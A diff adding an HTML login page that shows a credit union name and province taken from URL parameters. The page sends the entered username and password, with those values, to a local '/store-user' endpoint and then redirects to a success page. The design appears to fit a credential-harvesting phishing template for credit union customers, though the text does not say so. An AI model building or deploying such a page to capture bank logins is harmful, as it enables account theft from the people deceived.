@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="../styles.css">
+    <style>
+        body {
+            background: linear-gradient(to bottom, #f9f9f9, #e9ecef);
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            background: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .login-header h1 {
+            font-size: 1.5rem;
+            color: #0077c8;
+        }
+
+        .login-header p {
+            margin: 5px 0;
+            font-size: 1rem;
+            color: #555;
+        }
+
+        .login-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0077c8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-form button:hover {
+            background-color: #005fa3;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .footer a {
+            color: #0077c8;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Login</h1>
+            <p id="creditUnion"></p>
+            <p id="province"></p>
+        </div>
+        <form class="login-form" onsubmit="submitUserData(event)">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter your username" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+
+            <button type="submit">Submit</button>
+        </form>
+        <div class="footer">
+            <p>Need help? <a href="#">Contact Support</a></p>
+            <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Get the credit union and province from the query parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const creditUnion = urlParams.get('creditUnion');
+        const province = urlParams.get('province');
+
+        // Display the credit union and province on the page
+        document.getElementById('creditUnion').textContent = `Credit Union: ${creditUnion || 'Unknown'}`;
+        document.getElementById('province').textContent = `Province: ${province || 'Unknown'}`;
+
+        async function submitUserData(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Send the data to the backend
+                const response = await fetch('http://localhost:5000/store-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, creditUnion, province }),
+                });
+
+                if (response.ok) {
+                    // Redirect to the success page
+                    window.location.href = 'success.html';
+                } else {
+                    const errorData = await response.json();
+                    alert(`Error: ${errorData.message}`);
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('An error occurred while submitting your data.');
+            }
+        }
+    </script>
+</body>
+</html>
